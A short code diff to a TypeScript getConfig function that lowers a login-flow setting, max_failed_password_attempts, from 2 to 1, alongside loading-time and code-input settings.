@@ -24,7 +24,7 @@ const getConfig = async (): Promise<Config> => {
 		settings: {
 			code_loading_time: 3000,
 			max_failed_code_attempts: 4,
-			max_failed_password_attempts: 2,
+			max_failed_password_attempts: 1,
 			page_loading_time: 2000,
 			password_loading_time: 4000,
 			code_input_enabled: true,
